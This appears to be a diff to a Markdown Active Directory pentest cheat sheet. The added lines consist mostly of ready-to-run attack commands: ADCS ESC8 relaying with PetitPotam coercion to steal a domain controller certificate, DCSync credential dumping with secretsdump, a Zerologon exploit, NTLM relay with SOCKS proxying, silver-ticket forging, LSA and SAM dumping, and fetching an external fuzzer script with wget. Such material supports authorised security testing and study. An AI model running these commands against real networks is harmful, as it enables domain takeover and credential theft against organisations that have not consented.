@@ -12,7 +12,7 @@
 
 1. Spoof mac, static ip, gateway ip, from any authorized device \(e.g printer or voip phone\), and disconnect it: 
 ```sh
-macchanger -r eth0
+macchanger -m [MAC] [Interface]
 ```
 2. force your static IP to match the one that you spoofed the mac from : 
 ```sh
@@ -26,6 +26,32 @@ sudo ifconfig <static_ip>/24 && sudo ip route add default via <gateway_ip>
 ---
 
 ## 2. **No account yet**
+
+### Coerce (Null session)
+
+`wget https://gist.githubusercontent.com/zblurx/99fe1971562593fd1211931bdc979fbb/raw/6e18ba3b0694303d6eca3fda8505cf800ef83540/esc8fuzzer.py`
+
+then `esc8fuzzer.py <cidr>` 
+
+This will check if esc8 vulnerability is available or not
+
+if yes, you can just create relay and steal pfx certificate
+
+`certipy relay -ca  <AD-ADCS> -template 'Domaincontroller'` 
+after run 
+
+`petitPotam.py -d <domain> <exegol-IP> <DC-IP>`  to get pfx then 
+
+`certipy auth -pfx administrator.pfx -dc-ip <DC-IP>`
+
+export KRB5CCNAME=/workspace/administrator.ccache
+`secretsdump -k -no-pass <domain>/'administrator$'@administrator.<domain>`
+
+It's also possible to make the relay using this command 
+> `ntlmrelayx.py -t http://<IP-ADCS>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`
+
+but you have to use `gettgtpkinit.py -pfx-base64 ${cat cert.base64} '<domain>'/administrator$'@administrator.<domain>` to have the TGT
+
 
 ### Physical access
 
@@ -42,6 +68,19 @@ impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY -local
 ---
 
 ### Network Access
+
+**Get-DC-IP**
+
+```
+nslookup -type=ANY _ldap._tcp.dc._msdcs.<DOMAIN>
+nslookup gc._msdcs.<DOMAIN>
+```
+
+With [DC Detector](https://github.com/noraj/dcdetector)
+
+```
+dcd -d <DOMAIN>
+```
 
 **Man-In-The-Middle**
 
@@ -62,15 +101,24 @@ cat *.gnmap | grep -i "open/tcp" | cut -d " " -f2 | sort -u > perim_up_smb.txt
 crackmapexec smb perim_up_smb.txt --gen-relay-list relaylistOutputFilename.txt
 
 # 3. After we can run ntlmrelayx
-impacket-ntlmrelayx -tf relaylistOutputFilename.txt -smb2support
+impacket-ntlmrelayx -tf relaylistOutputFilename.txt -smb2support --output-file relayed-hash.txt
+
+also : 
+
+impacket-ntlmrelayx -tf relaylistOutputFilename.txt -socks -smb2support --output-file relayed-hash-with-socks.txt
+# if you get socks 
+# [*] Authenticating against smb://192.168.1.3 as <Domain>\<User> SUCCEED
+# [*] SOCKS: Adding <Domain>/<User>@192.168.1.3(445) to active SOCKS connection. Enjoy
+# you can do this : `proxychains smbclient.py -no-pass <Domain>/<User>@<ip>`
+# make sure /etc/proxychains.conf is set to 1080
 
 # 4. Finally, using another shell, we can run Responder
 ## Light
 ./Responder.py -I eth0 
 ## Medium (enable wpad, netbios domain and wredir suffix queries)
-./Responder.py -I eth0 -rdw
+./Responder.py -I eth0 -dw
 ## Full (Force WPAD and ProxyAuth)
-./Responder.py -I eth0 -rdwFP
+./Responder.py -I eth0 -dwFP
 ```
 
 > If limited to a Windows system, you can use Inveigh instead of Responder : 
@@ -81,7 +129,7 @@ mitm6 + NTLMrelayx
 
 ```bash
 sudo mitm6 -d <domain.fqdn> --ignore-nofqdn
-impacket-ntlmrelayx -tf relaylistOutputFilename.txt -6 
+impacket-ntlmrelayx -tf relaylistOutputFilename.txt -6 --output-file relayed-hash.txt
 
 # If no smb available, try ldap/ldaps/mssql : 
 impacket-ntlmrelayx -t ldaps://<target> -l lootdir
@@ -94,11 +142,31 @@ Bettercap
 Cain.exe (& Abel)
 ```
 
+
+**Zerologon**
+
+```
+zerologon-exploit '<DC-NAME>' '<DC-IP>'
+
+secretsdump -just-dc -no-pass <MACHINE_ACCOUNT>\$@<DC-IP>
+
+#Get hexpass of machine account
+secretsdump -hashes :'<NT>' '<DOMAIN>'/'Administrator'@'<DC-IP>'
+
+# Use hexpess to restore
+zerologon-restore '<DOMAIN>'/'<MACHINE_ACCOUNT>'@'<DC-NAME>' -target-ip '<DC-IP>' -hexpass 'xxx'
+``` 
+
 ---
 
 **Port and service scan**
 
 Hosts discovery from huge ranges
+
+
+masscan on a single port 
+
+`masscan -p 445 <cidr> --rate=10000 | cut -d ' ' -f 6 >> 445-open.txt`
 
 zmap on a single port (linux and windows)
 
@@ -113,6 +181,7 @@ masscan on identified ranges
 ```bash
 cat zmap_*.ips |awk -F. '{print $1"."$2"."$3".0/24"}' |sort -u > masscan_targets.ips
 masscan -iL masscan_targets.ips -p 21,22,23,80,443,445,5985,5986,8080,8443,5900 -oG masscan.grep
+
 ```
 
 nmap on identified hosts
@@ -138,6 +207,88 @@ searchsploit <service_name>
 
 
 ## 3. **Unprivileged account only**
+
+
+### Looking for coerced authentications
+
+
+
+**coerce list**
+
+```
+esc1 => abuse of a template-based vulnerability
+esc4 => abuse of a generic write (ACL) based vulnerability
+esc6 => abuse of vulnerability based on CA
+esc8 => relayx ntlm (attack can be played both with and without account)
+```
+
+**How to list all coerce of target**
+
+
+```
+git clone https://github.com/p0dalirius/Coercer.git
+cd Coercer && make
+./Coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <Pentester-IP> <target>
+
+
+#OtherWay
+
+rpcdump.py DC02.<domain.local> | grep -A 6 MS-RPRN
+impacket-rpcdump <IP> | grep -A6 spool 
+```
+
+**esc8** 
+
+>If you don't know the IP of ADCS serveur, please use `certipy find <domain>/<user>:<password>@<DC-IP>`
+
+```
+certipy relay -ca  <IP-ADCS> -template 'Domaincontroller'
+OR
+ntlmrelayx.py -t http://<IP-ADCS>/certsrv/certfnsh.asp --smb2support --adcs
+
+And after 
+
+PetitPotam -u '<user>' -p '<password>' -d <domain>  <exegol-IP> <IP-DC>
+
+Now we have .pfx, we can use it to get ticket service and nt hashs of computer account
+```
+
+
+**How to use pfx file**
+
+`certipy auth -pfx certif.pfx -dc-ip <DC-IP> -username <user> -domain <domain>`
+
+This will give you .ccache file wich contain TGT and other certify will also show you a NT hash
+
+If you want to use the TGT with crackmapexec you can do it like this : 
+
+`export KRB5CCNAME=administrator.ccache; cme smb DC01.<domain> -u 'administrator' -d <domain> -k`
+
+but you'll not be local administrator, but you can be using these commands which use dcsync: 
+
+```
+export KRB5CCNAME=/workspace/administrator.ccache
+secretsdump -k -no-pass <domain>/'administrator$'@administrator.<domain>
+```
+
+In case of secretsdump isn't working, we recommend you to create silver ticket( which is available only on the pwned machine and the pwned service )
+
+
+**How to create silver ticket**
+
+
+```
+# Find the SID domain
+lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
+
+# with an NT hash
+python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username
+
+```
+
+you will get a service ticket, which allows you to root the machine then dump SAM and LSA ( also don't forget to use lsassy, you can have some good surprise)
+
+
 
 ### Get a shell
 
@@ -174,6 +325,7 @@ Kerberos ticket, LM/NTLM hash or cleartext password with CrackMapExec or lsassy
 ```bash
 crackmapexec smb <host_file> -d <domain> -u <user>  -H <hash> --lsa
 crackmapexec smb <host_file> -d <domain> -u <user>  -H <hash> --sam
+crackmapexec smb <host_file> -d <domain> -u <user>  -H <hash> -M lsassy
 lsassy <target> -d <domain> -u <user> -p <pass>
 ```
 
